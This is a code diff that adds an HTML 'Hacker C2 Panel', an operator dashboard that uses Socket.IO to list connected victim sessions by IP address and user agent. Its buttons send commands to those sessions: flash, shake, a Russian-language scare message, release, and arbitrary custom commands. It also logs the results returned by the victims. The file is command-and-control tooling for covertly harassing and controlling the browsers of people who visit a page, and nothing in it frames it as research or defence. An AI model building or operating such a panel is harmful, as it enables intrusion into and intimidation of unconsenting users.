@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hacker C2 Panel</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 20px; }
+        h1, h2 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 5px; }
+        .session { border: 1px solid #0f0; padding: 10px; margin: 5px 0; background: #111; }
+        .session strong { color: #ff0; }
+        .session-info { font-size: 0.9em; color: #0a0; margin: 5px 0; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px 10px; margin-right: 5px; cursor: pointer; }
+        button:hover { background: #0f0; color: #000; }
+        .command-panel { margin-top: 20px; padding: 10px; border: 1px solid #0f0; background: #111; }
+        input, textarea { background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 300px; }
+        #log { background: #000; border: 1px solid #0f0; padding: 10px; height: 200px; overflow-y: scroll; font-size: 0.9em; margin-top: 10px; }
+        .log-entry { margin: 2px 0; }
+        .log-error { color: #f00; }
+        .log-success { color: #0f0; }
+        .log-info { color: #00f; }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+</head>
+<body>
+    <h1>🔴 ACTIVE SESSIONS</h1>
+    <div id="sessions"></div>
+
+    <h2>📋 COMMAND LOG</h2>
+    <div id="log"></div>
+
+    <script>
+        const socket = io();
+        const sessionsDiv = document.getElementById('sessions');
+        const logDiv = document.getElementById('log');
+
+        function addLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        socket.on('sessions_update', (sessionsData) => {
+            let html = '';
+            for (const [sid, info] of Object.entries(sessionsData)) {
+                html += `<div class="session" id="session-${sid}">
+                    <strong>${sid}</strong><br>
+                    <div class="session-info">IP: ${info.ip || '???'} | UA: ${info.user_agent || '???'}</div>
+                    <div>
+                        <button onclick="sendCommand('${sid}', 'flash')">💥 FLASH</button>
+                        <button onclick="sendCommand('${sid}', 'shake')">🌀 SHAKE</button>
+                        <button onclick="sendCommand('${sid}', 'message', 'ТЫ НЕ ОДИН!')">📩 SCARE</button>
+                        <button onclick="sendCommand('${sid}', 'release')">🔓 RELEASE</button>
+                    </div>
+                    <div style="margin-top: 5px;">
+                        <input type="text" id="custom-${sid}" placeholder="custom command" style="width: 200px;">
+                        <button onclick="sendCustomCommand('${sid}')">Send</button>
+                    </div>
+                </div>`;
+            }
+            sessionsDiv.innerHTML = html || '<p>No active sessions</p>';
+            addLog('Sessions updated: ' + Object.keys(sessionsData).join(', '), 'info');
+        });
+
+        function sendCommand(sessionId, cmd, payload = '') {
+            socket.emit('command', {session_id: sessionId, command: cmd, payload: payload});
+            addLog(`Command sent: ${cmd} to ${sessionId}`, 'success');
+        }
+
+        function sendCustomCommand(sessionId) {
+            const input = document.getElementById(`custom-${sessionId}`);
+            const cmd = input.value.trim();
+            if (cmd) {
+                sendCommand(sessionId, cmd, '');
+                input.value = '';
+            }
+        }
+
+        socket.on('command_status', (data) => {
+            if (data.status === 'sent') {
+                addLog(`Command ${data.command} delivered to ${data.session_id}`, 'success');
+            } else if (data.status === 'error') {
+                addLog(`Error: ${data.message}`, 'error');
+            } else {
+                addLog(`Status: ${data.status}`, 'info');
+            }
+        });
+
+        socket.on('command_result', (data) => {
+            addLog(`Result from ${data.session_id}: ${data.result}`, 'info');
+        });
+
+        socket.on('error', (data) => {
+            addLog(`Socket error: ${data.message}`, 'error');
+        });
+
+        socket.on('connect', () => {
+            addLog('Connected to server', 'success');
+        });
+
+        socket.on('disconnect', () => {
+            addLog('Disconnected from server', 'error');
+        });
+    </script>
+</body>
+</html>
